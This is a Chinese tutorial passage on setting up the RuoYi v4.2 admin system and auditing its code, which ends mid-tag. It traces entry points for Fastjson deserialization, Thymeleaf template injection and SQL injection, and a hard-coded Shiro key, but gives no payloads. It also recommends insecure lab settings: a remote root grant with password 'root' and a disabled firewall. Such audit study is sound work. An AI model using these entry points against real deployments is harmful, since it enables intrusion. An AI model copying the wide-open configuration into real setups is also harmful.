gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/绝对路径/</span>sql/ry_20200323.sql; 导入数据库文件<br></code></pre></td></tr></table></figure><p>③、使用IDEA打开本项目，等待Maven自动加载依赖项，如果时间较长需要自行配置Maven加速源。几个现象表明项目部署成功。<code>pom.xml</code>文件无报错，项目代码已编译为<code>class</code>，<code>Run/Debug Configurations...</code>处显示可以运行。</p><p>④、修改<code>src\main\resources\application-druid.yml</code>配置文件内容，具体如下图所示：</p><p><img src="/img/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.jpg" alt="配置文件"></p><p>⑤、点击启动<code>Run/Debug Configurations...</code>本项目。</p><p>⑥、项目访问地址如下：</p><ul><li>后台地址：<code>http://127.0.0.1:8088/login</code></li></ul><p>记得自己配下端口号，默认的是80端口。</p><p>⑦、登录账号密码<code>admin\admin123</code>。</p><h3 id="3、Linux环境的项目部署流程"><a href="#3、Linux环境的项目部署流程" class="headerlink" title="3、Linux环境的项目部署流程"></a>3、Linux环境的项目部署流程</h3><p>基于VMware虚拟机中的搭建的Ubuntu20操作系统</p><p><strong>注意</strong>：以下步骤需要Ubuntu系统中安装所需的软件，可参考星球之前发的一篇文章：<code>https://t.zsxq.com/Ea6qF6Y</code></p><p>本项目的默认打包方式就是JAR形式。并且本项目构建为SpringBoot多模块形式。我们所需要的运行的Jar程序打包在了<code>RuoYi-v4.2/ruoyi-admin/target</code>目录下。</p><p>整体部署流程如下：</p><p>①、使用IDEA打开项目，我们修改一下数据源链接地址。如下图所示：</p><p><img src="/img/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E6%BA%90%E5%9C%B0%E5%9D%80.jpg" alt="配置文件修改数据源地址"></p><p>我为了方便，将数据源直接连接到了Windows下mysql，也就是PHPstaduy一键启动的。如果你也想这样做，请注意以下几点：</p><ul><li>宿主机和虚拟机需要在同一网段下，简单来说就是能互相ping通。</li><li>Mysql启用远程访问，命令如下：</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.*  ‘root’@’%’ identified <span class="hljs-keyword">by</span> ‘root’ <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>; <br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure><p>②、使用Maven打包项目，选择若依总项目，依次点击<code>clean</code>和<code>package</code>，如下图所示：</p><p><img src="/img/%E6%89%93%E5%8C%85%E8%BF%87%E7%A8%8B.jpg" alt="打包过程"></p><p>③、我们将最终生成的<code>ruoyi-admin.jar</code>文件，复制粘贴到Ubuntu中。</p><p>④、在此，我们使用<code>sudo java -jar ruoyi-admin.jar</code>运行项目。如下图所示：</p><p><img src="/img/jar%E5%8C%85%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F.jpg" alt="jar包启动成功"></p><p>⑤、最后我们就可以正常访问了。</p><p><strong>:warning:注意：</strong></p><ul><li><code>java -jar</code>启动若依项目需要管理员权限，因此要在前面加上<code>sudo</code>，如果报错说找不到命令。需要修改<code>/etc/sudoers</code>文件中<code>Defaults secure_path</code>位置，在后面加上java路径，如下图所示：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>sudoers 打开该文件<br></code></pre></td></tr></table></figure><p><img src="/img/%E9%85%8D%E7%BD%AEsudo%E7%9A%84java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.jpg" alt="配置sudo的java环境变量"></p><ul><li>如果想要在其他环境中访问ruoyi，需要关闭防火墙，或者激活特定端口。偷个懒，直接关闭防火墙。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo ufw <span class="hljs-built_in">disable</span> 关闭防火墙<br></code></pre></td></tr></table></figure><h2 id="三、代码审计漏洞挖掘"><a href="#三、代码审计漏洞挖掘" class="headerlink" title="三、代码审计漏洞挖掘"></a>三、代码审计漏洞挖掘</h2><h3 id="1、第三方组件漏洞审计"><a href="#1、第三方组件漏洞审计" class="headerlink" title="1、第三方组件漏洞审计"></a>1、第三方组件漏洞审计</h3><p>本项目使用Maven构建的。因此我们直接看pom.xml文件引入了哪些组件。通过IDEA打开该若依，发现本项目采用了多模块方式。因此每个模块下都会有一个pom.xml，项目最外层的pom.xml为父POM。我们可以通过<code>pom.xml</code>或者<code>External Libraries</code>来确定引入组件的版本，具体整理如下：</p><table><thead><tr><th>组件名称</th><th>组件版本</th><th>是否存在漏洞</th></tr></thead><tbody><tr><td>shiro</td><td>1.4.2</td><td>存在</td></tr><tr><td>thymeleaf</td><td>2.0.0</td><td>存在</td></tr><tr><td>druid</td><td>1.1.14</td><td>不存在</td></tr><tr><td>mybatis</td><td>1.3.2</td><td>不存在</td></tr><tr><td>bitwalker</td><td>1.19</td><td>不存在</td></tr><tr><td>kaptcha</td><td>2.3.2</td><td>不存在</td></tr><tr><td>swagger</td><td>2.9.2</td><td>不存在</td></tr><tr><td>pagehelper</td><td>1.2.5</td><td>不存在</td></tr><tr><td>fastjson</td><td>1.2.60</td><td>存在</td></tr><tr><td>oshi</td><td>3.9.1</td><td>不存在</td></tr><tr><td>commons.io</td><td>2.5</td><td>存在</td></tr><tr><td>commons.fileupload</td><td>1.3.3</td><td>不存在</td></tr><tr><td>poi</td><td>3.17</td><td>存在</td></tr><tr><td>velocity</td><td>1.7</td><td>存在</td></tr><tr><td>snakeyaml</td><td>1.23</td><td>存在</td></tr></tbody></table><p>等等。</p><p>经过整理，我们发现本项目存在漏洞的组件为：<code>Shiro 1.4.2</code>，<code>Thymeleaf 2.0.0</code>，<code>Fastjson 1.2.60</code>，<code>Commons.io 2.5</code>，<code>oi 3.17</code>，<code>velocity 1.7</code>，<code>snakeyaml 1.23</code>……</p><p>通过版本号进行初步判断后，我们还需再进一步验证。</p><h3 id="2、组件漏洞代码审计"><a href="#2、组件漏洞代码审计" class="headerlink" title="2、组件漏洞代码审计"></a>2、组件漏洞代码审计</h3><p>针对存在漏洞的组件进行代码审计</p><h4 id="2-1、Shiro组件漏洞代码审计"><a href="#2-1、Shiro组件漏洞代码审计" class="headerlink" title="2.1、Shiro组件漏洞代码审计"></a>2.1、Shiro组件漏洞代码审计</h4><p>本项目使用了<code>Shiro 1.4.2</code>。Shiro在<code> 1.4.2 到 1.8.0</code>版本都是存在权限绕过的问题。</p><p>在代码审计中，我们主要关注<code>Shiro配置文件</code>，一般文件名为<code>ShiroConfig</code>。本项目Shiro配置文件位于<code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>。</p><p>进入Shiro配置文件，我们关注对资源访问的拦截器配置，位于<code>第231行 ~ 276行</code>。发现<code>第272行</code>作者使用了<code>/**</code>表达式，对路径进行拦截。因此，本项目<strong>不存在</strong>Shiro权限绕过的漏洞的。如下图所示：</p><p><img src="/img/shiro%E6%9D%83%E9%99%90%E5%8C%B9%E9%85%8D%E6%A8%A1%E5%BC%8F.jpg" alt="shiro权限匹配模式"></p><p>关于shiro的拦截匹配模式，Shiro的URL路径表达式为Ant格式有如下解释:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/hello：只匹配url，比如 http:/</span><span class="hljs-regexp">/7089.com/</span>hello<br><span class="hljs-regexp">/h?：只匹配url，比如 http:/</span><span class="hljs-regexp">/7089.com/</span>h+任意一个字符<br><span class="hljs-regexp">/hello/</span>*：匹配url下，比如 http:<span class="hljs-regexp">//</span><span class="hljs-number">7089</span>.com<span class="hljs-regexp">/hello/</span>xxxx 的任意内容，不匹配多个路径<br><span class="hljs-regexp">/hello/</span>**：匹配url下，比如 http:<span class="hljs-regexp">//</span><span class="hljs-number">7089</span>.com<span class="hljs-regexp">/hello/</span>xxxx/aaaa 的任意内容，匹配多个路径<br></code></pre></td></tr></table></figure><h4 id="2-2、Fastjson组件漏洞代码审计"><a href="#2-2、Fastjson组件漏洞代码审计" class="headerlink" title="2.2、Fastjson组件漏洞代码审计"></a>2.2、Fastjson组件漏洞代码审计</h4><p>本项目使用了<code>Fastjson 1.2.60</code>，<code>Fastjson &lt;= 1.2.68</code>都是存在漏洞的。</p><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数<code>parse</code>和<code>parseObject</code>。</p><p>搜索关键字发现本项目使用了<code>parseObject</code>，如下图所示：</p><p><img src="/img/parseObject%E5%85%B3%E9%94%AE%E5%AD%97%E6%90%9C%E7%B4%A2.jpg" alt="parseObject关键字搜索"></p><p>我们发现本项目使用的是<code>JSONObject.parseObject</code>方法，与第三套迷你天猫商城中<code>JSON.parseObject()</code>方法有所不同。JSONObject是一个继承自JSON的类，当调用JSONObject.parseObject（result）时，会直接调用父类的parseObject（String text）。两者也没什么区别，一个是用父类去调用父类自己的静态的parseObject（String text），一个是用子类去调用父类的静态parseObject（String text），两者调的是同一个方法。也是可以触发Fastjson反序列化漏洞的。</p><p>下面我们追踪下流程，看看是否有接收用户输入的地方。</p><p>①、双击进入<code>VelocityUtils.java</code>，第66行。代码如下图所示：</p><p><img src="/img/velocityUtils%E7%9A%8466%E8%A1%8C.jpg" alt="velocityUtils的66行"></p><p>②、从代码中看到<code>JSONObject.parseObject(options);</code>需要一个参数为<code>options</code>，该参数通过第65行发现来自<code>genTable.getOptions();</code>，ctrl加鼠标左键跟进，<code>getOptions()</code>返回值为<code>options</code>，如下图所示：</p><p><img src="/img/getOptions%E8%BF%94%E5%9B%9E%E5%80%BC.jpg" alt="getOptions返回值"></p><p>③、继续跟进<code>options</code>，根据作者注释理解这是一个<code>其它生成选项</code>的字段。如下图所示：</p><p><img src="/img/%E5%85%B6%E4%BB%96%E7%94%9F%E6%88%90%E9%80%89%E9%A1%B9%E5%AD%97%E6%AE%B5.jpg" alt="其他生成选项字段"></p><p>④、我们回过头来，追溯下功能点。跟进<code>setTreeVelocityContext</code>，发现是<code>prepareContext</code>中调用了它，如下图所示（为了便于截图展示，删除了部分代码）：</p><p><img src="/img/%E8%B7%9F%E8%BF%9BsetTreeVelocityContext.jpg" alt="跟进setTreeVelocityContext"></p><p>其中涉及到了一个判断条件，跟进一下，看如何触发该条件。跟进<code>GenConstants.TPL_TREE</code>，看到定义了一个常量字符为<code>tree</code>。如下图所示：</p><p><img src="/img/GenConstants%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6.jpg" alt="GenConstants判断条件"></p><p><img src="/img/%E8%BF%9B%E5%85%A5TPL_TREE.jpg" alt="进入TPL_TREE"></p><p>再跟进下<code>tplCategory</code>，该值来自于<code>genTable.getTplCategory();</code>如下图所示：</p><p><img src="/img/%E8%B7%9F%E8%BF%9BtplCategory.jpg" alt="跟进tplCategory"></p><p>进入<code>genTable.getTplCategory();</code>后，看到<code>getTplCategory()</code>返回值就是<code>tplCategory</code>，如下图所示：</p><p><img src="/img/getTplCategory%E8%BF%94%E5%9B%9E%E5%80%BC.jpg" alt="getTplCategory返回值"></p><p>继续跟进<code>tplCategory</code>，根据作者注释，这应该是是一个使用模板的字段。该字段应该有两个值，一个是<code>crud</code>，一个是<code>tree</code>。所以我们再找到功能点时，应该将这个字段值设为<code>tree</code>，如下图所示：</p><p><img src="/img/tplCategory%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89.jpg" alt="tplCategory字段含义"></p><p>中间穿插跟了下判断条件，我们继续追踪功能点。</p><p>⑤、回到<code>prepareContext()</code>方法，我们看下谁调用了他，发现<code>GenTaleServiceImpl.java</code>中第187行和250行都有所调用，如下图所示：</p><p><img src="/img/%E8%B0%81%E8%B0%83%E7%94%A8%E4%BA%86prepareContext.jpg" alt="谁调用了prepareContext"></p><p>⑥、单击进入<code>GenTaleServiceImpl.java</code>第187行，发现是<code>previewCode</code>方法使用了<code>VelocityUtils.prepareContext(table);</code>，其中<code>table参数</code>来自<code>genTableMapper.selectGenTableById(tableId);</code>根据<code>tableId</code>查询表信息返回的数据，如下图所示：</p><p><img src="/img/table%E5%8F%82%E6%95%B0%E6%9F%A5%E8%AF%A2%E8%A1%A8%E6%95%B0%E6%8D%AE%E8%BF%94%E5%9B%9E.jpg" alt="table参数查询表数据返回"></p><p>也就是说，我们只能操控<code>tableId</code>参数。继续跟踪一下<code>previewCode</code>，如下图所示：</p><p><img src="/img/previewCode%E6%96%B9%E6%B3%95.jpg" alt="previewCode方法"></p><p>⑦、（此处省略跳转到genTableService，无关紧要）ctrl加鼠标左键点击<code>previewCode</code>继续跟进，跳转到了<code>GenController</code>层，发现是<code>preview</code>使用了<code>genTableService.previewCode(tableId);</code>。如下图所示：</p><p><img src="/img/GenController%E7%9A%84preview.jpg" alt="GenController的preview"></p><p>并且通过注释信息了解到该功能是<code>预览代码</code>，路径是<code>/tool/gen/preview</code>，从路径中获取<code>tableId</code>。</p><p>既然这样，这条链是没办法利用Fastjosn反序列化漏洞了。</p><p>梅开二度，找条别的链，继续试试。</p><p>追踪了刚才搜索的四个点，发现<code>GenTaleServiceImpl.java</code>第286行这个参数也是我们可以操控的。</p><p>追踪流程如下。</p><p>（需要tplCategory&#x3D;tree才能进入该方法）</p><p>①、<code>GenTaleServiceImpl.java</code>第286行<code>JSONObject.parseObject(options);</code>处理<code>options</code>参数，该值来自<code>String options = JSON.toJSONString(genTable.getParams());</code>，如下图所示：</p><p><img src="/img/GenTaleServiceImpl%E7%9A%84options%E5%80%BC.jpg" alt="GenTaleServiceImpl的options值"></p><p>②、跟进<code>genTable.getParams()</code>，跳转到了<code>BASEEntity.java</code>代码中，因为<code>Gentable</code>继承<code>BASEEntity</code>。（此处写错了，看成set方法了，去看一眼set发现没有什么多余动作，传什么返回什么）根据判断条件，如果<code>params不等于null</code>的话，直接返回<code>params</code>。跟进<code>params</code>，注释表明该字段为<code>请求参数</code>，并且<code>params</code>被定义成<code>Map&lt;String, Object&gt;</code>，可以理解为params字段中可以传任何类型的值在里面。如下图所示（为便于截图展示，删除了部分代码）：</p><p><img src="/img/%E8%AF%B7%E6%B1%82%E5%AD%97%E6%AE%B5params.jpg" alt="请求字段params"></p><p>③、回到<code>GenTaleServiceImpl.java</code>，查看谁调用了<code>validateEdit</code>，跳转到了<code>IGenTaleService</code>第99行处，如下图所示：</p><p><img src="/img/validateEdit%E8%A2%AB%E8%B0%83%E7%94%A8.jpg" alt="validateEdit被调用"></p><p><img src="/img/validateEdit%E7%9A%84service%E5%B1%82.jpg" alt="validateEdit的service层"></p><p>④、继续跟进<code>validateEdit</code>，跳转到了<code>GenController</code>层第142行，如下图所示：</p><p><img src="/img/%E4%BF%AE%E6%94%B9%E4%BF%9D%E5%AD%98%E4%BB%A3%E7%A0%81controller.jpg" alt="修改保存代码controller"></p><p>至此，我们将这条链追踪完了。确定了功能点为代码生成处的<code>修改保存生成业务</code>，该路径部分为<code>edit</code>，完整路径为<code>/tool/gen/edit</code>，请求方法为POST，并且主要关注<code>params</code>这个字段。</p><h4 id="2-3、SnakeYaml组件漏洞代码审计"><a href="#2-3、SnakeYaml组件漏洞代码审计" class="headerlink" title="2.3、SnakeYaml组件漏洞代码审计"></a>2.3、SnakeYaml组件漏洞代码审计</h4><p>SnakeYaml在Java中，是用于解析YAML格式的库。</p><p>在第三方组件漏洞审计处，确定了SnakeYaml版本为1.23，被定为存在漏洞。</p><p>事实上，SnakeYaml几乎全版本都可被反序列化漏洞利用。</p><h5 id="2-3-1、漏洞简述"><a href="#2-3-1、漏洞简述" class="headerlink" title="2.3.1、漏洞简述"></a>2.3.1、漏洞简述</h5><p>SnakeYaml支持反序列化Java对象，所以当<code>Yaml.load()</code>函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。</p><p>全局搜索漏洞函数关键字，发现本项目并没有使用到<code>Yaml.load()</code>函数，如下图所示：</p><p><img src="/img/yamlload%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2.jpg" alt="yamlload全局搜索"></p><p>提前透露下，该漏洞可以和本项目定时任务配合打出RCE效果。</p><p>在这之前，请大家拓展学习下篇文章，补一下基础。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//www.mi<span class="hljs-number">1</span>k<span class="hljs-number">7</span>ea.com/<span class="hljs-number">2019</span>/<span class="hljs-number">11</span>/<span class="hljs-number">29</span>/Java-SnakeYaml<span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%E5</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%96</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%9</span>E/<br></code></pre></td></tr></table></figure><p>该部分漏洞验证将在渗透测试漏洞挖掘章节中配合定时任务功能进行讲述。</p><h4 id="2-4、Thymeleaf组件漏洞代码审计"><a href="#2-4、Thymeleaf组件漏洞代码审计" class="headerlink" title="2.4、Thymeleaf组件漏洞代码审计"></a>2.4、Thymeleaf组件漏洞代码审计</h4><p>在第三方组件漏洞审计时，了解到Thymeleaf组件版本为<code>2.0.0</code>，该版本存在SSTI（模板注入）漏洞。</p><p>关于什么是Thymeleaf，推荐学习这篇文章：<code>https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/introduction.html</code></p><h5 id="2-4-1、什么是SSTI（模板注入）漏洞"><a href="#2-4-1、什么是SSTI（模板注入）漏洞" class="headerlink" title="2.4.1、什么是SSTI（模板注入）漏洞"></a>2.4.1、什么是SSTI（模板注入）漏洞</h5><p>Server-Side Template Injection简称SSTI，也就是服务器端模板注入。</p><p>所谓的模板即为<code>模板引擎</code>。</p><p>本项目使用的Thymeleaf是众多模板引擎之一。还有其他Java常用的模板引擎，如：velocity，freemarker，jade等等。</p><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板加上用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模板注入（SSTI）漏洞成因，是因为服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p><h5 id="2-4-2、Thymeleaf模板注入漏洞简介"><a href="#2-4-2、Thymeleaf模板注入漏洞简介" class="headerlink" title="2.4.2、Thymeleaf模板注入漏洞简介"></a>2.4.2、Thymeleaf模板注入漏洞简介</h5><p>Thymeleaf模板注入形成原因，简单来说，在Thymeleaf模板文件中使用<code>th:fragment、</code>，<code>th:text</code>这类标签属性包含的内容会被渲染处理。并且在Thymeleaf渲染过程中使用<code>$&#123;...&#125;</code>或其他表达式中时内容会被Thymeleaf EL引擎执行。因此我们将攻击语句插入到<code>$&#123;...&#125;</code>表达式中，会触发Thymeleaf模板注入漏洞。</p><p>如果带有<code>@ResponseBody</code>注解和<code>@RestController</code>注解则不能触发模板注入漏洞。因为<code>@ResponseBody</code>和<code>@RestController</code>不会进行View解析而是直接返回。所以这同样是修复方式。</p><h5 id="2-4-3、发现SSTI（模板注入）漏洞点"><a href="#2-4-3、发现SSTI（模板注入）漏洞点" class="headerlink" title="2.4.3、发现SSTI（模板注入）漏洞点"></a>2.4.3、发现SSTI（模板注入）漏洞点</h5><p>我们在审计模板注入（SSTI）漏洞时，主要查看所使用的模板引擎是否有接受用户输入的地方。主要关注xxxController层代码。</p><p>在Controller层，我们关注两点：<code>1、URL路径可控。</code>，<code>2、return内容可控。</code></p><p>所谓可控，也就是接受输入。对应上面两个关注点，举例说明如下。</p><p>1、URL路径可控</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/whoami/&#123;name&#125;/&#123;sex&#125;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span>  <span class="hljs-title function_">hello</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-built_in">String</span> name, <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;sex&quot;</span>) <span class="hljs-built_in">String</span> sex</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span> + name + sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、return内容可控</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/getNames&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getCacheNames</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> fragment, ModelMap mmap</span>)<br>&#123;<br>mmap.<span class="hljs-title function_">put</span>(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.<span class="hljs-title function_">getCacheNames</span>());<br><span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br></code></pre></td></tr></table></figure><p>视角转回到本项目。</p><p>根据上面两个关注点，对<code>若依v4.2</code>进行了一番探索。并没有发现存在Thymeleaf模板注入漏洞点。</p><p>但在<code>若依v4.7.1</code>发现存在<code>return内容可控</code>的情况。为了学习该漏洞，下面以<code>若依v4.7.1</code>版本进行Thymeleaf模板注入代码审计学习。</p><p>在<code>若依v4.7.1</code>的<code>RuoYi-v4.7.1\ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor</code>下多了一个<code>CacheController.java</code>文件。该文件下有多个地方<code>Return内容可控</code>，如下图所示：</p><p><img src="/img/%E5%A4%9A%E4%B8%AAreturn%E5%86%85%E5%AE%B9%E5%8F%AF%E6%8E%A7.jpg" alt="多个return内容可控"></p><p>简单理解：接收到<code>fragment</code>后，在return处进行了模板路径拼接。</p><p>根据代码我们知道根路径为<code>/monitor/cache</code>，各个接口路径分别为<code>/getNames</code>，<code>/getKeys</code>，<code>/getValue</code>。请求方法为<code>POST</code>，请求参数均为<code>fragment</code>。</p><p>知道了这些内容，我们在渗透测试部分进行漏洞验证。</p><p>系统还有存在其他漏洞点，大家可以自由发挥找一找。</p><h3 id="3、单点漏洞审计"><a href="#3、单点漏洞审计" class="headerlink" title="3、单点漏洞审计"></a>3、单点漏洞审计</h3><h4 id="3-1、SQL注入漏洞代码审计"><a href="#3-1、SQL注入漏洞代码审计" class="headerlink" title="3.1、SQL注入漏洞代码审计"></a>3.1、SQL注入漏洞代码审计</h4><p>单点漏洞代码审计首当其冲当然要先看SQL注入漏洞是否存在，全局搜索关键字<code>$</code>，并限定文件类型为<code>.xml</code>，发现<code>sysDeptMapper.xml</code>和<code>sysUserMapper.xml</code>有存在SQL注入的地方，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5mapper%E6%96%87%E4%BB%B6.jpg" alt="sql注入mapper文件"></p><p>挑个幸运的Mapper小伙伴，追踪下流程，找到他的注入点。</p><p>那就选择<code>SysRoleMapper.xml</code>这个吧，刚刚搜索结果他们没在一起。如下图所示：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5RoleMapper.jpg" alt="SQL注入RoleMapper"></p><p>①、点击进入<code>SysRoleMapper.xml</code>，SQL注入点在第58行，使用<code>$</code>直接拼接了参数，如下图所示：</p><p><img src="/img/rolemapper%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE.jpg" alt="rolemapper的sql注入点位置"></p><p>②、点击左侧箭头快速跳转到DAO层（IDEA中需要安装Free Mybatis plugin插件），如下图所示：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E7%82%B9dao%E5%B1%82.jpg" alt="SQL注入点dao层"></p><p>③、键盘按住Ctrl加鼠标左键，点击<code>selectRoleList</code>，查看谁调用了它。最终来到<code>SysRoleServiceImpl</code>的实现层，如下图所示：</p><p><img src="/img/selectRoleList%E7%9A%84%E8%B0%83%E7%94%A8.jpg" alt="selectRoleList的调用"></p><p>④、进入<code>SysRoleServiceImpl</code>后，再回溯到<code>SysRoleService</code>层，可使用左侧快速跳转按钮。或者选中<code>selectRoleList</code>后使用快捷键<code>ctrl+u</code>，如下图所示：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0%E5%B1%82.jpg" alt="SQL注入实现层"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5service%E5%B1%82.jpg" alt="sql注入service层"></p><p>⑤、键盘按住Ctrl加鼠标左键，点击<code>selectRoleList</code>，回溯到<code>Controller</code>层，最终发现是<code>SysRoleController</code>调用了这个方法，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5service%E7%9A%84controller%E8%B0%83%E7%94%A8.jpg" alt="sql注入service的controller调用"></p><p>⑥、点击进入，最终定位到<code>src\main\java\com\ruoyi\web\controller\system\SysRoleController.java</code>，第58行和第68行都有调用，如下图所示：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5Controller%E5%B1%82.jpg" alt="SQL注入Controller层"></p><p>⑦、键盘按住Ctrl加鼠标左键，点击<code>SysRole</code>，进入看看定义了哪些实体类，其中发现了<code>DataScope</code>，如下图所示：</p><p><img src="/img/sysrole%E5%AD%97%E6%AE%B5.jpg" alt="sysrole字段"></p><p>⑧、回顾追溯流程</p><p>回顾下整理流程，如下所示：</p><p><code>sysRoleMapper.xml</code> -&gt; <code>SysRoleMapper.java</code> -&gt; <code>SysRoleServiceImpl.java</code> -&gt; <code>ISysRoleService.java</code> -&gt; <code>SysRoleController.java</code></p><p><img src="/img/%E5%9B%9E%E6%BA%AF%E5%85%A8%E6%B5%81%E7%A8%8B.jpg" alt="回溯全流程"></p><p>简单说，我们从<code>XxxxMapper</code>文件追踪到<code>Controller</code>层，主要就是在找漏洞入口。顺带看看整个流程是否对参数有特殊处理。</p><p>⑨、汇总信息</p><p>最后，我们将追溯的过程，以及有用的信息汇总一下。</p><ul><li>通过Controller层，我们可以知道，漏洞URL路径为<code>/system/role/list</code></li><li>通过Service层和Controller层的注释，我们大致知道该功能位于角色信息处。</li></ul><p>大致知道这些信息后，下一步访问WEB页面，找找这个功能，并通过渗透测试验证一下。</p><p>剩下几个还存在SQL注入漏洞的地方，追溯过程留作业给你们。务必动手操作，加深印象。举一反三，形成笔记后，并提交到对应的作业处。</p><h4 id="3-2、Shiro密钥硬编码代码审计"><a href="#3-2、Shiro密钥硬编码代码审计" class="headerlink" title="3.2、Shiro密钥硬编码代码审计"></a>3.2、Shiro密钥硬编码代码审计</h4><p>在看Shiro配置文件时，发现了Shiro密钥硬编码写在了代码文件中。代码位于<code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>，第331行。如下图所示：</p><p><img src="/img/shiro%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5.jpg" alt="shiro硬编码密钥"></p><p>在黑盒测试中，我们常使用爆破的方式来探测目标是否使用了常见的弱密钥。</p><p>但在代码审计我们可以直接通过搜索关键字<code>setCipherKey</code>，来看看密钥是否硬编码在了代码中。</p><p>攻击者在知道了密钥后，就可以构造恶意payload，经过序列化、AES加密、base64编码操作加工后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。</p><p>既然我们从代码处知道了密钥，那么我们就可以直接对他进行反序列化攻击了。</p><h4 id="3-3、定时任务功能漏洞代码审计"><a href="#3-3、定时任务功能漏洞代码审计" class="headerlink" title="3.3、定时任务功能漏洞代码审计"></a>3.3、定时任务功能漏洞代码审计</h4><p>在项目简介中，我们了解到本项目中有使用到定时任务功能。</p><p>又根据官方文档的文件结构处，我们了解到本项目定时任务功能在<code>ruoyi-quartz </code>模块下，使用的是<code>quartz </code>框架。如下图所示：</p><p><img src="/img/ruoyi-quartz%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84.jpg" 